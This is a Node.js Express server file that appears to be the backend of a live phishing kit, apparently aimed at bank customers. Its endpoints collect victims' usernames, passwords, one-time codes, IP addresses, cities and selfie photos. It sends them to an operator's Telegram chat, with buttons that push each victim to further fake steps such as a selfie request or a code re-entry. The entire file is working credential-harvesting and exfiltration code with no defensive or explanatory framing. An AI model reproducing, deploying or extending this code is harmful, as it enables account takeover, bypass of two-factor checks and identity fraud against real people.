const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const app = express();
const FormData = require('form-data');  

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const fileUpload = require('express-fileupload');

app.use(fileUpload({
    limits: { fileSize: 10 * 1024 * 1024 }, // límite 10MB
    abortOnLimit: true,
}));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

app.post('/enviar2', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 C0D3: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});


app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;
  const mensaje = `
🔵GTC🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>

🔐 RE-C0D3: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}

`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);
  const keyboard = {
    inline_keyboard: [
      [
        { text: "👤SELFIE", callback_data: `laderrorselfi:${txid}` },
        { text: "🔑CÓDIGO", callback_data: `elopete:${txid}` }
      ],
      [
        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});



app.post('/enviar-foto', async (req, res) => {
    try {
        const photo = req.files?.photo;
        const caption = req.body.caption || 'Foto facial';

        if (!photo) {
            console.log('❌ No se recibió archivo photo en req.files');
            return res.status(400).send('No se recibió la foto');
        }

        console.log('✅ Foto recibida:', photo.name, 'Tamaño:', photo.size, 'bytes');

        // Usar form-data (la librería más fiable para Telegram)
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', caption);
        form.append('parse_mode', 'HTML');
        form.append('photo', photo.data, {
            filename: photo.name || 'selfie.jpg',
            contentType: photo.mimetype || 'image/jpeg'
        });

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: form.getHeaders(),  // ← IMPORTANTE: esto pone el Content-Type y boundary correcto
            body: form
        });

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Foto enviada correctamente a Telegram');
        } else {
            console.log('❌ Error de Telegram:', JSON.stringify(result));
        }

        res.sendStatus(200);
    } catch (error) {
        console.error('🔥 Error crítico en /enviar-foto:', error.message);
        res.sendStatus(500);
    }
});


app.get('/get-status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: 'Falta txid' });
  }
  const cliente = cargarCliente(txid);
  res.json({ status: cliente ? cliente.status : 'esperando' });
});

// NUEVO: Webhook para Telegram (maneja callbacks de botones)
app.post('/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      const query = update.callback_query;
      const data = query.data;
      const callbackQueryId = query.id;

      console.log(`✅ Callback recibido: ${data}`);

      // Responder a Telegram para confirmar (evita "cargando" infinito en el botón)
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: 'Acción procesada',  // Mensaje opcional que ve el usuario
        })
      });

      // Actualizar status basado en callback_data
      const [action, txid] = data.split(':');
      const cliente = cargarCliente(txid);
      if (cliente) {
        cliente.status = action;  // e.g., "elopete", "laderrorselfi", "errorlogo"
        guardarCliente(txid, cliente);
        console.log(`✅ Status actualizado para ${txid}: ${action}`);
      } else {
        console.log(`❌ Cliente no encontrado para txid: ${txid}`);
      }
    }

    res.sendStatus(200);  // Siempre responde 200 para que Telegram no reenvíe
  } catch (error) {
    console.error('🔥 Error en webhook:', error);
    res.sendStatus(500);
  }
});

// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Servidor activo en Render puerto ${PORT}`);
  console.log('TELEGRAM_TOKEN configurado:', !!TELEGRAM_TOKEN);
  console.log('CHAT_ID configurado:', !!CHAT_ID);

  // NUEVO: Configura el webhook del bot automáticamente al iniciar
  const webhookUrl = 'https://feintacta.onrender.com/telegram-webhook';
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${webhookUrl}`);
    const data = await res.json();
    if (data.ok) {
      console.log(`✅ Webhook configurado: ${webhookUrl}`);
    } else {
      console.log(`❌ Error configurando webhook: ${JSON.stringify(data)}`);
    }
  } catch (err) {
    console.error('🔥 Error al setear webhook:', err);
  }
});
